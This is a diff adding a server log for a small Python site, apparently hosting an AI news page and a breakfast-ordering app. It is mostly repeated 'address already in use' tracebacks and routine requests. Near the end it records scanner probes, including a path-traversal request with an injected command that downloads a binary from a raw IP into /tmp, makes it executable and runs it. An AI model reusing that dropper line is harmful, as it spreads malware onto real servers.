+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /impressum HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /imprint HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /about HTTP/1.1" 404 -
+127.0.0.1 - - "OPTIONS / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "POST /xmlrpc.php HTTP/1.1" 400 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /sitemap.xml HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /aaa9 HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /aab9 HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /aaa9 HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /aab9 HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /images/ai-icon.png HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+统一站点服务器启动: 端口 8080
+  AI资讯站:  http://0.0.0.0/
+  早餐点单:  http://0.0.0.0/breakfast/
+Traceback (most recent call last):
+  File "/root/.openclaw/workspace/breakfast-order/site-server.py", line 221, in <module>
+    ReuseServer(("0.0.0.0", PORT), Handler).serve_forever()
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/socketserver.py", line 456, in __init__
+    self.server_bind()
+  File "/usr/lib64/python3.11/http/server.py", line 136, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib64/python3.11/socketserver.py", line 472, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+统一站点服务器启动: 端口 8080
+  AI资讯站:  http://0.0.0.0/
+  早餐点单:  http://0.0.0.0/breakfast/
+Traceback (most recent call last):
+  File "/root/.openclaw/workspace/breakfast-order/site-server.py", line 221, in <module>
+    ReuseServer(("0.0.0.0", PORT), Handler).serve_forever()
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/socketserver.py", line 456, in __init__
+    self.server_bind()
+  File "/usr/lib64/python3.11/http/server.py", line 136, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib64/python3.11/socketserver.py", line 472, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+统一站点服务器启动: 端口 8080
+  AI资讯站:  http://0.0.0.0/
+  早餐点单:  http://0.0.0.0/breakfast/
+Traceback (most recent call last):
+  File "/root/.openclaw/workspace/breakfast-order/site-server.py", line 221, in <module>
+    ReuseServer(("0.0.0.0", PORT), Handler).serve_forever()
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/socketserver.py", line 456, in __init__
+    self.server_bind()
+  File "/usr/lib64/python3.11/http/server.py", line 136, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib64/python3.11/socketserver.py", line 472, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+统一站点服务器启动: 端口 8080
+  AI资讯站:  http://0.0.0.0/
+  早餐点单:  http://0.0.0.0/breakfast/
+Traceback (most recent call last):
+  File "/root/.openclaw/workspace/breakfast-order/site-server.py", line 221, in <module>
+    ReuseServer(("0.0.0.0", PORT), Handler).serve_forever()
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/socketserver.py", line 456, in __init__
+    self.server_bind()
+  File "/usr/lib64/python3.11/http/server.py", line 136, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib64/python3.11/socketserver.py", line 472, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+统一站点服务器启动: 端口 8080
+  AI资讯站:  http://0.0.0.0/
+  早餐点单:  http://0.0.0.0/breakfast/
+Traceback (most recent call last):
+  File "/root/.openclaw/workspace/breakfast-order/site-server.py", line 221, in <module>
+    ReuseServer(("0.0.0.0", PORT), Handler).serve_forever()
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/socketserver.py", line 456, in __init__
+    self.server_bind()
+  File "/usr/lib64/python3.11/http/server.py", line 136, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib64/python3.11/socketserver.py", line 472, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+统一站点服务器启动: 端口 8080
+  AI资讯站:  http://0.0.0.0/
+  早餐点单:  http://0.0.0.0/breakfast/
+Traceback (most recent call last):
+  File "/root/.openclaw/workspace/breakfast-order/site-server.py", line 221, in <module>
+    ReuseServer(("0.0.0.0", PORT), Handler).serve_forever()
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/socketserver.py", line 456, in __init__
+    self.server_bind()
+  File "/usr/lib64/python3.11/http/server.py", line 136, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib64/python3.11/socketserver.py", line 472, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+统一站点服务器启动: 端口 8080
+  AI资讯站:  http://0.0.0.0/
+  早餐点单:  http://0.0.0.0/breakfast/
+Traceback (most recent call last):
+  File "/root/.openclaw/workspace/breakfast-order/site-server.py", line 221, in <module>
+    ReuseServer(("0.0.0.0", PORT), Handler).serve_forever()
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/socketserver.py", line 456, in __init__
+    self.server_bind()
+  File "/usr/lib64/python3.11/http/server.py", line 136, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib64/python3.11/socketserver.py", line 472, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+统一站点服务器启动: 端口 8080
+  AI资讯站:  http://0.0.0.0/
+  早餐点单:  http://0.0.0.0/breakfast/
+Traceback (most recent call last):
+  File "/root/.openclaw/workspace/breakfast-order/site-server.py", line 221, in <module>
+    ReuseServer(("0.0.0.0", PORT), Handler).serve_forever()
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/socketserver.py", line 456, in __init__
+    self.server_bind()
+  File "/usr/lib64/python3.11/http/server.py", line 136, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib64/python3.11/socketserver.py", line 472, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+统一站点服务器启动: 端口 8080
+  AI资讯站:  http://0.0.0.0/
+  早餐点单:  http://0.0.0.0/breakfast/
+Traceback (most recent call last):
+  File "/root/.openclaw/workspace/breakfast-order/site-server.py", line 221, in <module>
+    ReuseServer(("0.0.0.0", PORT), Handler).serve_forever()
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/socketserver.py", line 456, in __init__
+    self.server_bind()
+  File "/usr/lib64/python3.11/http/server.py", line 136, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib64/python3.11/socketserver.py", line 472, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+统一站点服务器启动: 端口 8080
+  AI资讯站:  http://0.0.0.0/
+  早餐点单:  http://0.0.0.0/breakfast/
+Traceback (most recent call last):
+  File "/root/.openclaw/workspace/breakfast-order/site-server.py", line 221, in <module>
+    ReuseServer(("0.0.0.0", PORT), Handler).serve_forever()
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/socketserver.py", line 456, in __init__
+    self.server_bind()
+  File "/usr/lib64/python3.11/http/server.py", line 136, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib64/python3.11/socketserver.py", line 472, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+统一站点服务器启动: 端口 8080
+  AI资讯站:  http://0.0.0.0/
+  早餐点单:  http://0.0.0.0/breakfast/
+Traceback (most recent call last):
+  File "/root/.openclaw/workspace/breakfast-order/site-server.py", line 221, in <module>
+    ReuseServer(("0.0.0.0", PORT), Handler).serve_forever()
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/socketserver.py", line 456, in __init__
+    self.server_bind()
+  File "/usr/lib64/python3.11/http/server.py", line 136, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib64/python3.11/socketserver.py", line 472, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+统一站点服务器启动: 端口 8080
+  AI资讯站:  http://0.0.0.0/
+  早餐点单:  http://0.0.0.0/breakfast/
+Traceback (most recent call last):
+  File "/root/.openclaw/workspace/breakfast-order/site-server.py", line 221, in <module>
+    ReuseServer(("0.0.0.0", PORT), Handler).serve_forever()
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/socketserver.py", line 456, in __init__
+    self.server_bind()
+  File "/usr/lib64/python3.11/http/server.py", line 136, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib64/python3.11/socketserver.py", line 472, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+统一站点服务器启动: 端口 8080
+  AI资讯站:  http://0.0.0.0/
+  早餐点单:  http://0.0.0.0/breakfast/
+Traceback (most recent call last):
+  File "/root/.openclaw/workspace/breakfast-order/site-server.py", line 221, in <module>
+    ReuseServer(("0.0.0.0", PORT), Handler).serve_forever()
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/socketserver.py", line 456, in __init__
+    self.server_bind()
+  File "/usr/lib64/python3.11/http/server.py", line 136, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib64/python3.11/socketserver.py", line 472, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+统一站点服务器启动: 端口 8080
+  AI资讯站:  http://0.0.0.0/
+  早餐点单:  http://0.0.0.0/breakfast/
+Traceback (most recent call last):
+  File "/root/.openclaw/workspace/breakfast-order/site-server.py", line 221, in <module>
+    ReuseServer(("0.0.0.0", PORT), Handler).serve_forever()
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/socketserver.py", line 456, in __init__
+    self.server_bind()
+  File "/usr/lib64/python3.11/http/server.py", line 136, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib64/python3.11/socketserver.py", line 472, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+统一站点服务器启动: 端口 8080
+  AI资讯站:  http://0.0.0.0/
+  早餐点单:  http://0.0.0.0/breakfast/
+Traceback (most recent call last):
+  File "/root/.openclaw/workspace/breakfast-order/site-server.py", line 221, in <module>
+    ReuseServer(("0.0.0.0", PORT), Handler).serve_forever()
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/socketserver.py", line 456, in __init__
+    self.server_bind()
+  File "/usr/lib64/python3.11/http/server.py", line 136, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib64/python3.11/socketserver.py", line 472, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+统一站点服务器启动: 端口 8080
+  AI资讯站:  http://0.0.0.0/
+  早餐点单:  http://0.0.0.0/breakfast/
+Traceback (most recent call last):
+  File "/root/.openclaw/workspace/breakfast-order/site-server.py", line 221, in <module>
+    ReuseServer(("0.0.0.0", PORT), Handler).serve_forever()
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/socketserver.py", line 456, in __init__
+    self.server_bind()
+  File "/usr/lib64/python3.11/http/server.py", line 136, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib64/python3.11/socketserver.py", line 472, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+统一站点服务器启动: 端口 8080
+  AI资讯站:  http://0.0.0.0/
+  早餐点单:  http://0.0.0.0/breakfast/
+Traceback (most recent call last):
+  File "/root/.openclaw/workspace/breakfast-order/site-server.py", line 221, in <module>
+    ReuseServer(("0.0.0.0", PORT), Handler).serve_forever()
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/socketserver.py", line 456, in __init__
+    self.server_bind()
+  File "/usr/lib64/python3.11/http/server.py", line 136, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib64/python3.11/socketserver.py", line 472, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+统一站点服务器启动: 端口 8080
+  AI资讯站:  http://0.0.0.0/
+  早餐点单:  http://0.0.0.0/breakfast/
+Traceback (most recent call last):
+  File "/root/.openclaw/workspace/breakfast-order/site-server.py", line 221, in <module>
+    ReuseServer(("0.0.0.0", PORT), Handler).serve_forever()
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/socketserver.py", line 456, in __init__
+    self.server_bind()
+  File "/usr/lib64/python3.11/http/server.py", line 136, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib64/python3.11/socketserver.py", line 472, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+统一站点服务器启动: 端口 8080
+  AI资讯站:  http://0.0.0.0/
+  早餐点单:  http://0.0.0.0/breakfast/
+Traceback (most recent call last):
+  File "/root/.openclaw/workspace/breakfast-order/site-server.py", line 221, in <module>
+    ReuseServer(("0.0.0.0", PORT), Handler).serve_forever()
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/socketserver.py", line 456, in __init__
+    self.server_bind()
+  File "/usr/lib64/python3.11/http/server.py", line 136, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib64/python3.11/socketserver.py", line 472, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+统一站点服务器启动: 端口 8080
+  AI资讯站:  http://0.0.0.0/
+  早餐点单:  http://0.0.0.0/breakfast/
+Traceback (most recent call last):
+  File "/root/.openclaw/workspace/breakfast-order/site-server.py", line 221, in <module>
+    ReuseServer(("0.0.0.0", PORT), Handler).serve_forever()
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/socketserver.py", line 456, in __init__
+    self.server_bind()
+  File "/usr/lib64/python3.11/http/server.py", line 136, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib64/python3.11/socketserver.py", line 472, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+统一站点服务器启动: 端口 8080
+  AI资讯站:  http://0.0.0.0/
+  早餐点单:  http://0.0.0.0/breakfast/
+Traceback (most recent call last):
+  File "/root/.openclaw/workspace/breakfast-order/site-server.py", line 221, in <module>
+    ReuseServer(("0.0.0.0", PORT), Handler).serve_forever()
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/socketserver.py", line 456, in __init__
+    self.server_bind()
+  File "/usr/lib64/python3.11/http/server.py", line 136, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib64/python3.11/socketserver.py", line 472, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+统一站点服务器启动: 端口 8080
+  AI资讯站:  http://0.0.0.0/
+  早餐点单:  http://0.0.0.0/breakfast/
+Traceback (most recent call last):
+  File "/root/.openclaw/workspace/breakfast-order/site-server.py", line 221, in <module>
+    ReuseServer(("0.0.0.0", PORT), Handler).serve_forever()
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/socketserver.py", line 456, in __init__
+    self.server_bind()
+  File "/usr/lib64/python3.11/http/server.py", line 136, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib64/python3.11/socketserver.py", line 472, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+统一站点服务器启动: 端口 8080
+  AI资讯站:  http://0.0.0.0/
+  早餐点单:  http://0.0.0.0/breakfast/
+Traceback (most recent call last):
+  File "/root/.openclaw/workspace/breakfast-order/site-server.py", line 221, in <module>
+    ReuseServer(("0.0.0.0", PORT), Handler).serve_forever()
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/socketserver.py", line 456, in __init__
+    self.server_bind()
+  File "/usr/lib64/python3.11/http/server.py", line 136, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib64/python3.11/socketserver.py", line 472, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+127.0.0.1 - - "GET /breakfast/api/menu HTTP/1.1" 200 -
+127.0.0.1 - - "GET /breakfast/api/menu HTTP/1.1" 200 -
+127.0.0.1 - - "GET /breakfast/ HTTP/1.1" 200 -
+127.0.0.1 - - "GET /breakfast/api/menu HTTP/1.1" 200 -
+127.0.0.1 - - "GET /breakfast/api/orders HTTP/1.1" 200 -
+127.0.0.1 - - "GET /breakfast/ HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "POST /xmlrpc.php HTTP/1.1" 400 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /images/ai-icon.png HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /mcp HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /mcp/ HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /api/mcp HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /sse HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /.git/config HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /owa/auth/x.js HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /apply.cgi HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "POST /ztp/cgi-bin/handler HTTP/1.1" 404 -
+127.0.0.1 - - "POST /remote/error HTTP/1.1" 400 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /api/v1/totp/user-backup-code/../../license/keys-status?url=wget%20http%3A//104.238.149.90%3A8888/bins2/Hilix.x86%20-O%20/tmp/h%3B%20chmod%20777%20/tmp/h%3B%20/tmp/h%20Hilix.IVA HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /global-protect/portal HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET /breakfast/ HTTP/1.1" 200 -
